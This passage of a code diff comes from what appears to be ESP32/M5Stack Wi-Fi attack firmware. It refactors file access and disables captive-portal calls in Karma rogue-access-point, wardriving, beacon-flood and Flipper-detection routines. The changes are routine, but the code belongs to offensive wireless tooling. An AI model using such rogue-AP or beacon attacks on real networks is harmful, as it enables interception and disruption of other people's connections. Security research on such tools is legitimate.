-    ui.drawMenu();
 }
 
 int currentChannel = 1;
@@ -2919,7 +2661,7 @@ void startAutoKarma() {
     sendMessage("-------------------");
 
     config.readConfigFile();
-    createCaptivePortal();
+    //createCaptivePortal();
     WiFi.softAPdisconnect(true);
     loopAutoKarma();
     esp_wifi_set_promiscuous(false);
@@ -3051,7 +2793,6 @@ void loopAutoKarma() {
     isWaitingForProbeDisplayed = false;
     isInitialDisplayDone = false;
     ui.setInMenu(true);
-    ui.drawMenu();
 }
 
 void activateAPForAutoKarma(const char* ssid) {
@@ -3270,7 +3011,7 @@ void wardrivingMode() {
         SD.mkdir("/wardriving");
     }
 
-    File root = SD.open("/wardriving");
+    File root = openFile("/wardriving");
     int maxIndex = 0;
     while (true) {
         File entry = root.openNextFile();
@@ -3365,13 +3106,13 @@ void wardrivingMode() {
             String fileName = "/wardriving/wardriving-0" + String(maxIndex + 1) + ".csv";
 
             // Ouvrir le fichier en mode lecture pour vérifier s'il existe et sa taille
-            File file = SD.open(fileName, FILE_READ);
+            File file = openFile(fileName, FILE_READ);
             bool isNewFile = !file || file.size() == 0;
             if (file) {
                 file.close();
             }
 
-            file = SD.open(fileName, isNewFile ? FILE_WRITE : FILE_APPEND);
+            file = openFile(fileName, isNewFile ? FILE_WRITE : FILE_APPEND);
 
             if (file) {
                 if (isNewFile) {
@@ -3389,7 +3130,7 @@ void wardrivingMode() {
 
         if (M5.BtnB.isPressed()) {
             exitWardriving = true;
-            if (confirmPopup("List Open Networks?")) {
+            if (ui.confirmPopup("List Open Networks?")) {
                 createKarmaList(maxIndex);
             }
             ui.waitAndReturnToMenu("Stopping Wardriving.");
@@ -3432,7 +3173,7 @@ String formatTimeFromGPS() {
 void createKarmaList(int maxIndex) {
     std::set<std::string> uniqueSSIDs;
     // Lire le contenu existant de KarmaList.txt et l'ajouter au set
-    File karmaListRead = SD.open("/KarmaList.txt", FILE_READ);
+    File karmaListRead = openFile("/KarmaList.txt", FILE_READ);
     if (karmaListRead) {
         while (karmaListRead.available()) {
             String ssid = karmaListRead.readStringUntil('\n');
@@ -3444,13 +3185,7 @@ void createKarmaList(int maxIndex) {
         karmaListRead.close();
     }
 
-    File file = SD.open("/wardriving/wardriving-0" + String(maxIndex + 1) + ".csv", FILE_READ);
-    if (!file) {
-        sendMessage("Error opening scan file");
-        return;
-    } else {
-        sendMessage("Scan file opened successfully");
-    }
+    File file = openFile("/wardriving/wardriving-0" + String(maxIndex + 1) + ".csv", FILE_READ);
 
     while (file.available()) {
         String line = file.readStringUntil('\n');
@@ -3462,13 +3197,7 @@ void createKarmaList(int maxIndex) {
     file.close();
 
     // Écrire le set dans KarmaList.txt
-    File karmaListWrite = SD.open("/KarmaList.txt", FILE_WRITE);
-    if (!karmaListWrite) {
-        sendMessage("Error opening KarmaList.txt for writing");
-        return;
-    } else {
-        sendMessage("KarmaList.txt opened for writing");
-    }
+    File karmaListWrite = openFile("/KarmaList.txt", FILE_WRITE);
 
     sendMessage("Writing to KarmaList.txt");
     for (const auto& ssid : uniqueSSIDs) {
@@ -3511,8 +3240,8 @@ void returnToMenu() {
 
 void karmaSpear() {
     isAutoKarmaActive = true;
-    createCaptivePortal();
-    File karmaListFile = SD.open("/KarmaList.txt", FILE_READ);
+    //createCaptivePortal();
+    File karmaListFile = openFile("/KarmaList.txt", FILE_READ);
     if (!karmaListFile) {
         sendMessage("Error opening KarmaList.txt");
         returnToMenu(); // Retour au menu si le fichier ne peut pas être ouvert
@@ -3578,7 +3307,7 @@ void karmaSpear() {
 // beacon attack
 
 std::vector<String> readCustomBeacons(const char* filename) {
-    File file = SD.open(filename, FILE_READ);
+    File file = openFile(filename, FILE_READ);
     std::vector<String> customBeacons;
 
     if (!file) {
@@ -3609,7 +3338,7 @@ void beaconAttack() {
     WiFi.mode(WIFI_MODE_AP);
 
     // Demander à l'utilisateur s'il souhaite utiliser des beacons personnalisés
-    bool useCustomBeacons = confirmPopup("Use custom beacons?");
+    bool useCustomBeacons = ui.confirmPopup("Use custom beacons?");
     M5.Display.clear();
 
     std::vector<String> customBeacons;
@@ -4001,7 +3730,7 @@ class MyAdvertisedDeviceCallbacks: public BLEAdvertisedDeviceCallbacks {
 };
 
 bool isMacAddressRecorded(const String& macAddress) {
-    File file = SD.open("/WoF.txt", FILE_READ);
+    File file = openFile("/WoF.txt", FILE_READ);
     if (!file) {
         return false;
     }
@@ -4019,7 +3748,7 @@ bool isMacAddressRecorded(const String& macAddress) {
 
 void recordFlipper(const String& name, const String& macAddress, const String& color, bool isValidMac) {
     if (!isMacAddressRecorded(macAddress)) {
-        File file = SD.open("/WoF.txt", FILE_APPEND);
+        File file = openFile("/WoF.txt", FILE_APPEND);
         if (file) {
             String status = isValidMac ? " - normal" : " - spoofed"; // Détermine le statut basé sur isValidMac
             file.println(name + " - " + macAddress + " - " + color + status);
